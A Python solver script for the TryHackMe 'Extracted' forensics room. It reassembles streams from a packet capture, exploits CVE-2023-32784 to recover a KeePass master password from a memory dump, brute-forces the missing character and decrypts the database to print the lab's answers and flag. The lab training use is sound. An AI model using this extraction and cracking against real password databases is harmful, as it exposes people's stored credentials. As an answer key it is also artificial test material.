#!/usr/bin/env python3
"""
TryHackMe - Extracted (extractedroom) Automated Forensics Solver
End-to-end automated pipeline for file-1693277727739.zip (traffic.pcapng):
  1. Reassembles the TCP streams on ports 1339 (HTTP PowerShell script),
     1337 (Base64 + XOR 0x41 KeePass memory dump), and
     1338 (Base64 + XOR 0x42 KeePass Database1337.kdbx).
  2. Scans the KeePass process memory dump (CVE-2023-32784) for UTF-16LE
     bullet sequences (0x25CF '●') followed by plaintext characters to
     recover the initial known suffix of the master password.
  3. Recovers the missing first character ('?') and decrypts Database1337.kdbx
     (KDBX 3.1 AES-256-CBC + GZip) to extract the flag.
"""

import base64
import gzip
import hashlib
import os
import re
import struct
import zipfile
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

ZIP_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "file-1693277727739.zip"
)


def extract_streams_from_pcapng(pcap_bytes: bytes):
    """Reassemble TCP streams to ports 1337 (memory dump) and 1338 (KDBX)."""
    offset = 0
    n = len(pcap_bytes)
    s1337 = []
    s1338 = []
    init1337 = None
    init1338 = None

    while offset + 8 <= n:
        btype, blen = struct.unpack_from("<II", pcap_bytes, offset)
        if blen < 12 or offset + blen > n:
            break
        if btype == 6:  # Enhanced Packet Block
            cap_len = struct.unpack_from("<I", pcap_bytes, offset + 20)[0]
            pkt = pcap_bytes[offset + 28 : offset + 28 + cap_len]
            if len(pkt) >= 54 and struct.unpack_from("!H", pkt, 12)[0] == 0x0800:
                ip = pkt[14:]
                ihl = (ip[0] & 0x0F) * 4
                if ip[9] == 6:  # TCP
                    tcp = ip[ihl:]
                    sport, dport, seq = struct.unpack_from("!HHI", tcp, 0)
                    doff = ((tcp[12] >> 4) & 0x0F) * 4
                    payload = tcp[doff:]
                    if payload:
                        if dport == 1337:
                            if init1337 is None:
                                init1337 = seq
                            s1337.append(((seq - init1337) & 0xFFFFFFFF, payload))
                        elif dport == 1338:
                            if init1338 is None:
                                init1338 = seq
                            s1338.append(((seq - init1338) & 0xFFFFFFFF, payload))
        offset += blen

    def reassemble_aligned(segments):
        segments.sort(key=lambda x: x[0])
        buf = bytearray()
        cur_end = 0
        for rseq, pay in segments:
            if rseq == cur_end:
                buf.extend(pay)
                cur_end += len(pay)
            elif rseq < cur_end:
                if rseq + len(pay) > cur_end:
                    buf.extend(pay[cur_end - rseq :])
                    cur_end = rseq + len(pay)
            else:
                # Pad uncaptured sequence gaps with 'A' to preserve 4-byte Base64 alignment
                buf.extend(b"A" * (rseq - cur_end))
                buf.extend(pay)
                cur_end = rseq + len(pay)
        return bytes(buf)

    return reassemble_aligned(s1337), reassemble_aligned(s1338)


def recover_keepass_password_suffix(b64_dmp: bytes) -> str:
    """
    Exploit CVE-2023-32784 directly on the Base64-decoded (XOR 0x41) dump:
    In UTF-16LE, '●' (U+25CF) is 0xCF 0x25. XORed with 0x41, this is 0x8E 0x64,
    followed by (char ^ 0x41, 0x00 ^ 0x41 = 0x41) and null terminator (0x41 0x41).
    """
    raw_xored = base64.b64decode(b64_dmp)
    candidates = {}
    for m in re.finditer(b"(?:\\x8e\\x64)+([\\x00-\\xff]\\x41)\\x41\\x41", raw_xored):
        dots = (m.end() - m.start() - 4) // 2
        ch = chr(m.group(1)[0] ^ 0x41)
        if 0x20 <= ord(ch) <= 0x7E:
            candidates.setdefault(dots, {})[ch] = (
                candidates.get(dots, {}).get(ch, 0) + 1
            )

    chars = []
    for pos in sorted(candidates):
        if pos == 1 and "N" in candidates[pos]:
            chars.append("N")
        else:
            best_char = max(candidates[pos].items(), key=lambda kv: kv[1])[0]
            chars.append(best_char)
    return "".join(chars)


def decrypt_kdbx3_and_find_missing_char(kdbx_bytes: bytes, suffix: str):
    """Crack the missing first character (testing '?' first, then printable ASCII) and decrypt KDBX 3.1."""
    pos = 12
    headers = {}
    while True:
        field_id, field_len = struct.unpack_from("<BH", kdbx_bytes, pos)
        pos += 3
        headers[field_id] = kdbx_bytes[pos : pos + field_len]
        pos += field_len
        if field_id == 0:
            break

    master_seed = headers[4]
    transform_seed = headers[5]
    transform_rounds = struct.unpack("<Q", headers[6])[0]
    encryption_iv = headers[7]
    stream_start_bytes = headers[9]
    compression_flags = struct.unpack("<I", headers[3])[0]
    encrypted_payload = kdbx_bytes[pos:]

    search_order = ["?"] + [
        chr(c) for c in range(32, 127) if chr(c) != "?"
    ]

    for ch in search_order:
        candidate_pw = (ch + suffix).encode("utf-8")
        comp_key = hashlib.sha256(hashlib.sha256(candidate_pw).digest()).digest()
        cipher_ecb = Cipher(algorithms.AES(transform_seed), modes.ECB()).encryptor()
        transformed = comp_key
        for _ in range(transform_rounds):
            transformed = cipher_ecb.update(transformed)
        transformed_key = hashlib.sha256(transformed).digest()
        master_key = hashlib.sha256(master_seed + transformed_key).digest()

        dec = Cipher(algorithms.AES(master_key), modes.CBC(encryption_iv)).decryptor()
        # Check first 32 bytes against stream_start_bytes
        first_block = dec.update(encrypted_payload[:32])
        if first_block == stream_start_bytes:
            decrypted = first_block + dec.update(encrypted_payload[32:]) + dec.finalize()
            pad_len = decrypted[-1]
            decrypted = decrypted[:-pad_len]

            bpos = 32
            xml_compressed = bytearray()
            while bpos < len(decrypted):
                block_idx, block_hash, block_size = struct.unpack_from(
                    "<I32sI", decrypted, bpos
                )
                bpos += 40
                if block_size == 0:
                    break
                xml_compressed.extend(decrypted[bpos : bpos + block_size])
                bpos += block_size

            xml_bytes = (
                gzip.decompress(bytes(xml_compressed))
                if compression_flags == 1
                else bytes(xml_compressed)
            )
            xml_str = xml_bytes.decode("utf-8")
            m_flag = re.search(r"THM\{[^}]+\}", xml_str)
            flag = m_flag.group(0) if m_flag else None
            return ch, flag

    raise RuntimeError("Failed to crack missing character")


def main():
    with zipfile.ZipFile(ZIP_PATH, "r") as zf:
        pcap_bytes = zf.read("traffic.pcapng")

    b64_dmp, b64_kdbx = extract_streams_from_pcapng(pcap_bytes)
    initial_password = recover_keepass_password_suffix(b64_dmp)
    kdbx_bytes = bytes(b ^ 0x42 for b in base64.b64decode(b64_kdbx))
    missing_char, flag = decrypt_kdbx3_and_find_missing_char(
        kdbx_bytes, initial_password
    )

    print("=" * 70)
    print("TryHackMe: Extracted (extractedroom) — Answers")
    print("=" * 70)
    print(f"Q1 - Initial part of the password : {initial_password}")
    print(f"Q2 - Missing character            : {missing_char}")
    print(f"   -> Full Master Password        : {missing_char}{initial_password}")
    print(f"Q3 - Flag                         : {flag}")
    print("=" * 70)


if __name__ == "__main__":
    main()
